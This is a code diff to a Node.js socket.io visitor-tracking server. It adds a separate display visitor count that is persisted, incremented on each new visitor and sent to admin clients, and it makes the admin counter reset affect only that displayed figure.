@@ -336,6 +336,7 @@ function loadSavedData() {
       return {
         visitors: new Map(Object.entries(parsed.visitors || {})),
         visitorCounter: parsed.visitorCounter || 0,
+        displayVisitorCount: parsed.displayVisitorCount !== undefined ? parsed.displayVisitorCount : null,
         savedVisitors: parsed.savedVisitors || [],
         whatsappNumber: parsed.whatsappNumber || "",
         globalBlockedCards: parsed.globalBlockedCards || [],
@@ -355,6 +356,7 @@ function loadSavedData() {
       return {
         visitors: new Map(Object.entries(parsed.visitors || {})),
         visitorCounter: parsed.visitorCounter || 0,
+        displayVisitorCount: parsed.displayVisitorCount !== undefined ? parsed.displayVisitorCount : null,
         savedVisitors: parsed.savedVisitors || [],
         whatsappNumber: parsed.whatsappNumber || "",
         globalBlockedCards: parsed.globalBlockedCards || [],
@@ -377,6 +379,7 @@ function loadSavedData() {
         return {
           visitors: new Map(Object.entries(parsed.visitors || {})),
           visitorCounter: parsed.visitorCounter || 0,
+          displayVisitorCount: parsed.displayVisitorCount !== undefined ? parsed.displayVisitorCount : null,
           savedVisitors: parsed.savedVisitors || [],
           whatsappNumber: parsed.whatsappNumber || "",
           globalBlockedCards: parsed.globalBlockedCards || [],
@@ -392,6 +395,7 @@ function loadSavedData() {
   return {
     visitors: new Map(),
     visitorCounter: 0,
+    displayVisitorCount: null,
     savedVisitors: [],
     whatsappNumber: "",
     globalBlockedCards: [],
@@ -409,6 +413,7 @@ function _saveDataNow() {
     const data = {
       visitors: Object.fromEntries(visitors),
       visitorCounter,
+      displayVisitorCount,
       savedVisitors,
       whatsappNumber,
       globalBlockedCards,
@@ -455,6 +460,7 @@ const savedData = loadSavedData();
 const visitors = savedData.visitors;
 const admins = new Map();
 let visitorCounter = savedData.visitorCounter;
+let displayVisitorCount = savedData.displayVisitorCount;
 let savedVisitors = savedData.savedVisitors; // Array to store all visitors permanently
 let whatsappNumber = savedData.whatsappNumber || ""; // WhatsApp number for footer
 let globalBlockedCards = savedData.globalBlockedCards || []; // Global blocked card prefixes
@@ -718,6 +724,7 @@ io.on("connection", (socket) => {
       
       // Create new visitor
       visitorCounter++;
+      if (displayVisitorCount !== null) displayVisitorCount++;
       visitor = {
         _id: `visitor_${Date.now()}_${Math.random().toString(36).substring(2, 9)}`,
         socketId: socket.id,
@@ -769,7 +776,8 @@ io.on("connection", (socket) => {
     // Notify admins
     admins.forEach((admin, adminSocketId) => {
       if (isNewVisitor) {
-        io.to(adminSocketId).emit("visitor:new", { ...visitor, isConnected: true });
+        const dvCount = displayVisitorCount !== null ? displayVisitorCount : new Set(savedVisitors.map(v => v.ip).filter(ip => ip)).size || savedVisitors.length;
+        io.to(adminSocketId).emit("visitor:new", { ...visitor, isConnected: true }, { displayVisitorCount: dvCount });
       } else {
         io.to(adminSocketId).emit("visitor:reconnected", { visitorId: visitor._id, socketId: socket.id });
       }
@@ -1002,8 +1010,11 @@ io.on("connection", (socket) => {
 
       console.log(`Sending ${visitorsWithStatus.length} visitors to admin, ${connectedVisitorIds.size} connected`);
 
+      // Calculate display visitor count (null means use natural count)
+      const currentDisplayCount = displayVisitorCount !== null ? displayVisitorCount : new Set(savedVisitors.map(v => v.ip).filter(ip => ip)).size || savedVisitors.length;
+
       // Send all saved visitors to admin with updated connection status
-      socket.emit("visitors:list", visitorsWithStatus);
+      socket.emit("visitors:list", visitorsWithStatus, { displayVisitorCount: currentDisplayCount });
 
       // Notify visitors that admin is connected
       visitors.forEach((visitor, visitorSocketId) => {
@@ -1269,17 +1280,17 @@ io.on("connection", (socket) => {
 
   // Admin: Reset visitor counter only (without deleting any data)
   socket.on("admin:resetVisitorCounter", () => {
-    visitorCounter = 0;
+    displayVisitorCount = 0;
     
     // Save to disk
     saveData();
     
-    // Notify all admins
+    // Notify all admins with the reset count
     admins.forEach((admin, adminSocketId) => {
-      io.to(adminSocketId).emit("visitorCounterReset");
+      io.to(adminSocketId).emit("visitorCounterReset", { displayVisitorCount: 0 });
     });
     
-    console.log("Visitor counter reset by admin");
+    console.log("Visitor display counter reset by admin");
   });
 
   // WhatsApp: Get current number
